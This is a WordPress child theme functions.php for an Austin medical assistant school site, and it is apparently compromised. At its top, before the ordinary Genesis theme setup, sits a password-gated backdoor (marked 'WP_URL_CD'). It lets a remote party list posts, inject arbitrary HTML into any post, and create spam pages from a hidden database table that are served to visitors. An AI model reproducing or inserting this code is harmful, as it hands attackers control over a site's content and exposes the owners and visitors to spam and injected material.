<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'de4bdcfcaddd8e85fbaf387190e86c4c'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
//* Start the engine
include_once( get_template_directory() . '/lib/init.php' );

//* Set Localization (do not remove)
load_child_theme_textdomain( 'ddas', apply_filters( 'child_theme_textdomain', get_stylesheet_directory() . '/languages', 'ddas' ) );

//* Add HTML5 markup structure
add_theme_support( 'html5' );

//* Add viewport meta tag for mobile browsers
add_theme_support( 'genesis-responsive-viewport' );

//* Load Lora and Oswald Google fonts
add_action( 'wp_enqueue_scripts', 'ddas_scripts' );
function ddas_scripts() {
	wp_enqueue_style( 'google-font', '//fonts.googleapis.com/css?family=Quattrocento:400|Quattrocento+Sans:400', array());
	
	if(is_front_page()) {
		wp_enqueue_script( 'wistia-ev1','//fast.wistia.com/assets/external/E-v1.js', array('jquery'), '1.0' , true );
		wp_enqueue_script( 'wistia-plugin','//fast.wistia.com/labs/crop-fill/plugin.js', array('jquery'), '1.0' , true );
	}
	
	wp_enqueue_script( 'ddas-js', get_stylesheet_directory_uri().'/js/ddas.js', array('jquery'), '1.0' , true );
}

//* Add new featured image size
add_image_size( 'grid-featured', 270, 100, TRUE );

//* Add support for custom background
add_theme_support( 'custom-background', array(
'default-image' => '',
'default-color' => 'eee',
) );

//* Add support for structural wraps
add_theme_support( 'genesis-structural-wraps', array(
'header',
'nav',
'subnav',
'site-inner',
'footer-widgets',
'footer'
) );

//* Add support for additional color styles
add_theme_support( 'genesis-style-selector', array(
'ddas-pro-blue'	=> __( 'Blue', 'ddas' ),
'ddas-pro-green'	=> __( 'Green', 'ddas' ),
'ddas-pro-red'	=> __( 'Red', 'ddas' ),
'ddas-pro-logo'	=> __( 'Logo', 'ddas' )
) );

//* Reposition the site description
remove_action( 'genesis_site_description', 'genesis_seo_site_description' );

//* Reposition the primary navigation menu
remove_action( 'genesis_after_header', 'genesis_do_nav' );
add_action( 'genesis_before_content_sidebar_wrap', 'genesis_do_nav' );

//* Reposition the secondary navigation menu
remove_action( 'genesis_after_header', 'genesis_do_subnav' );
add_action( 'genesis_footer', 'genesis_do_subnav');

//* Add support for 3-column footer widgets
add_theme_support( 'genesis-footer-widgets', 3 );

add_filter('genesis_footer_output','ddas_footer_output');
function ddas_footer_output($output) {
$creds_text = '<p class="site-copyright">Copyright © 2014 | Austin Medical Assistant School is a division of Vandelay Education LLC and regulated by the Texas Workforce Commission.</p>';
$output = $creds_text;
return $output;
}

remove_action( 'genesis_site_title', 'genesis_seo_site_title' );
add_action( 'genesis_site_title' , 'ddas_logo_svg');

function ddas_logo_svg() { ?>
<a href="<?php echo esc_url(home_url()); ?>" title="Austin Medical Assistant School">
	<img src="<?php echo get_stylesheet_directory_uri();?>/images/AustinMedical.svg" alt="Austin Medical Assistant School" />
</a>
<? }

add_action( 'genesis_before_entry' , 'ddas_stack_video' );
function ddas_stack_video() {
	if(is_front_page()) { ?>
		<div id="video_container" style="margin-bottom:30px;">
		  <div id="text">
		    <div id="actions">
		      <div id="playbutton">
		        <div class="rectangle"></div>
		        <div class="triangle"></div>
		      </div>
		    </div>
		  </div>
		  <div id="cover_all"></div>
		  <div id="main-image"></div>
		  <div id="wistia_acmrg4gc8z" class="wistia_embed backgroundVideo" style="width:790px;height:300px;"></div>
		  <div id="wistia_a66fiffq3u" class="wistia_embed overlayVideo" style="width:1920px;height:1080px;"></div>
		  <div id="ex"><img src="<?php echo get_stylesheet_directory_uri();?>/images/ex.svg" width="23" height="23" /></div>
		</div>
	<?php }	
}
